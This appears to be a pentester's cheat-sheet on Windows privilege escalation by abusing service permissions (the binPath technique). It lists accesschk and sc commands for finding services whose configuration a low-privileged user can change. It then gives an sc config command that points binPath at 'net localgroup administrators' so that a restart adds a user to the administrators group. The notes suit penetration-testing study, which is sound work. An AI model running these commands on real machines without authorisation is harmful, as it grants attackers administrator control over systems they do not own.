## binPath
### Recon
- Run accesschk to see all service names where we have write access:
```
accesschk64.exe -uwcv Everyone *
```
- See service where we have SERVICE_CHANGE_CONFIG perm.
- Can also use `PowerUp.ps1`, check under 'Checking service permissions`.
- Query the service:
```
sc qc <service name>
```

### Exploitation
- Since we can change the config. we can set the binPath to a malicious command. Like add user.
```
sc config <service name> binpath= "net localgroup administrators user /add"
```
- Restart the service might get an error but user will be added.
